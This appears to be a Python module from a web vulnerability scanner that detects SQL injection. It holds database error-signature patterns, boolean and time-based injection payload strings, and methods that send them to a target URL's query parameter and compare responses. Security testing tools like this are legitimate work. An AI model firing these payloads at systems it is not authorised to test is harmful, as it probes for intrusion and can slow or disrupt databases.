"""
SQL injection detection helper.

Provides:
  - Error-based SQLi error signature list (MySQL, PostgreSQL, MSSQL, Oracle,
    SQLite, etc.) to fingerprint the backend from a response body
  - A small payload set for boolean/time-based detection
  - A response comparator for boolean-based detection

This is a *detection* helper — it does not extract data or exploit.
"""
from __future__ import annotations
import re
import time
from dataclasses import dataclass
from typing import List, Optional, Tuple

from ..utils.http import HttpClient


# Database error signatures (substring matches, case-insensitive)
SQL_ERROR_SIGNATURES: List[Tuple[str, str]] = [
    ("mysql", "SQL syntax.*MySQL"),
    ("mysql", "Warning.*mysql_"),
    ("mysql", "MySqlException"),
    ("mysql", "valid MySQL result"),
    ("postgresql", "PostgreSQL.*ERROR"),
    ("postgresql", "Warning.*pg_"),
    ("postgresql", "valid PostgreSQL result"),
    ("postgresql", "Npgsql\\."),
    ("mssql", "Driver.* SQL\\-\\*Server"),
    ("mssql", "OLE DB.* SQL Server"),
    ("mssql", "SQLServer JDBC Driver"),
    ("mssql", "macromedia\\.com/sql"),
    ("mssql", "Unclosed quotation mark"),
    ("oracle", "\\bORA\\-[0-9]{4,5}"),
    ("oracle", "Oracle error"),
    ("oracle", "quoted string not properly terminated"),
    ("sqlite", "SQLite/JDBCDriver"),
    ("sqlite", "SQLite\\.Exception"),
    ("sqlite", "sqlite_query\\("),
    ("ibm_db2", "CLI Driver.*DB2"),
    ("ibm_db2", "DB2 SQL error"),
    ("informix", "Exception.*Informix"),
    ("firebird", "Dynamic SQL Error"),
    ("sybase", "Sybase server"),
    ("sybase", "Sybase message"),
]

# Boolean payloads (true/false pairs). Append to a parameter value.
BOOLEAN_PAYLOADS = [
    ("' AND '1'='1", "' AND '1'='2"),
   ("' AND 1=1--", "' AND 1=2--"),
   ('" AND "1"="1', '" AND "1"="2'),
   (" AND 1=1", " AND 1=2"),
   (") AND 1=1--", ") AND 1=2--"),
]

# Time-based payloads (suffix appended). Backend-agnostic-ish; measure latency.
TIME_PAYLOADS = [
    ("mysql", "' AND SLEEP(5)--"),
    ("mysql", "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"),
    ("postgresql", "'; SELECT pg_sleep(5)--"),
    ("mssql", "'; WAITFOR DELAY '0:0:5'--"),
    ("oracle", "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)='a"),
    ("sqlite", "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--"),
]


@dataclass
class SqliError:
    database: str
    signature: str
    match: str


class SqliHelper:
    def __init__(self, client: Optional[HttpClient] = None):
        self.client = client or HttpClient()
        self._sigs = [(db, re.compile(sig, re.IGNORECASE | re.DOTALL))
                       for db, sig in SQL_ERROR_SIGNATURES]

    def fingerprint_errors(self, body: str) -> List[SqliError]:
        """Identify a SQL backend from error strings in a response body."""
        out: List[SqliError] = []
        for db, pat in self._sigs:
            m = pat.search(body)
            if m:
                out.append(SqliError(db, pat.pattern, m.group(0)))
        return out

    def boolean_payloads(self) -> List[Tuple[str, str]]:
        return list(BOOLEAN_PAYLOADS)

    def time_payloads(self) -> List[Tuple[str, str]]:
        return list(TIME_PAYLOADS)

    def test_boolean(self, base_url: str, param: str, normal_value: str,
                     client: Optional[HttpClient] = None) -> Optional[str]:
        """
        Send true/false payload pairs and compare response lengths/status.
        Returns a description of the detected payload pair, or None.
        """
        cli = client or self.client
        from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

        def inject(suffix: str) -> str:
            p = urlparse(base_url)
            qs = [(k, (normal_value + suffix) if k == param else v)
                  for k, v in parse_qsl(p.query)]
            return urlunparse(p._replace(query=urlencode(qs)))

        # baseline
        base = cli.get(base_url)
        if base.status is None or base.error:
            return None
        base_len = len(base.body)

        for true_p, false_p in BOOLEAN_PAYLOADS:
            r_true = cli.get(inject(true_p))
            r_false = cli.get(inject(false_p))
            if r_true.status is None or r_false.status is None:
                continue
            # Boolean true should resemble baseline, false should differ
            if (abs(len(r_true.body) - base_len) <= 5 and
                    abs(len(r_false.body) - base_len) > 50 and
                    r_true.status == r_false.status == 200):
                return (f"boolean-based SQLi likely: '{true_p}' / '{false_p}' "
                        f"(true={len(r_true.body)}B false={len(r_false.body)}B base={base_len}B)")
        return None

    def test_time_based(self, base_url: str, param: str, normal_value: str,
                        threshold: float = 4.0,
                        client: Optional[HttpClient] = None) -> Optional[str]:
        """Send time-based payloads and flag responses exceeding threshold."""
        cli = client or self.client
        from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

        def inject(suffix: str) -> str:
            p = urlparse(base_url)
            qs = [(k, (normal_value + suffix) if k == param else v)
                  for k, v in parse_qsl(p.query)]
            return urlunparse(p._replace(query=urlencode(qs)))

        baseline = cli.get(base_url)
        if baseline.elapsed > threshold:
            return None  # already slow, unreliable

        for db, payload in TIME_PAYLOADS:
            start = time.time()
            r = cli.get(inject(payload))
            if r.elapsed >= threshold:
                return (f"time-based SQLi likely ({db}): payload '{payload}' "
                        f"responded in {r.elapsed:.2f}s (baseline {baseline.elapsed:.2f}s)")
        return None
